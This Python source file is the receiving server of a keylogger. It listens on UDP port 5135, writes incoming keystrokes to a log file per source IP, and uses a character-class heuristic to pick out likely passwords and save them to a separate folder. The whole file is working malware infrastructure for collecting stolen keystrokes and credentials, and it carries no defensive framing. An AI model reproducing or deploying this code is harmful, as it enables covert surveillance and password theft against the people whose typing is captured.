#!/usr/bin/python
import threading
import socket
import time
import Queue
import re
import os

KEYLOGS_PATH = os.path.join(os.getcwd(), "keylogs")
PASSWORDS_PATH = os.path.join(os.getcwd(), "passwords")

MSG_SIZE = 1024

symbols = "`~!@#$%^&*()_+-={}[]|\\;:\"\',./<>?"

req_queue = Queue.Queue()

# determines if msg might contain a password so long as it has 3 of 4 certain types of characters
def contains_password(msg):
    has_upper = 0
    has_lower = 0
    has_digit = 0
    has_symbol = 0
    for c in msg:
        if c.isupper():
            has_upper = 1
        if c.islower():
            has_lower = 1
        if c.isdigit():
            has_digit = 1
        if c in symbols:
            has_symbol = 1
    total = has_upper + has_lower + has_digit + has_symbol
    if total >= 3:
        return True
    return False


def handle_requests(sock):
    while True:
        addr, data = req_queue.get()
        fname = str(addr[0])
        with open(os.path.join(KEYLOGS_PATH, fname), "a") as keylog_f:
            keylog_f.write(data)

        if contains_password(data):
            with open(os.path.join(PASSWORDS_PATH, fname), "a") as passwd_f:
                passwd_f.write(data + "\n")

def main():
    HOST = ""
    PORT = 5135
    
    # create directories for keylog and password files if they don't exist yet
    if not os.path.exists(KEYLOGS_PATH):
        os.makedirs(KEYLOGS_PATH)
    if not os.path.exists(PASSWORDS_PATH):
        os.makedirs(PASSWORDS_PATH)

    serv_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    serv_sock.bind((HOST, PORT))
    req_handler_thread = threading.Thread(target=handle_requests, args = tuple([serv_sock]))
    req_handler_thread.daemon = True
    req_handler_thread.start()
    while True:
        msg, addr = serv_sock.recvfrom(MSG_SIZE)
#        print("Received from %s: %s" % (addr, msg))
        req_queue.put((addr, msg))

    serv_sock.shutdown(socket.SHUT_RDWR)
    serv_sock.close()

if __name__ == "__main__":
    main()
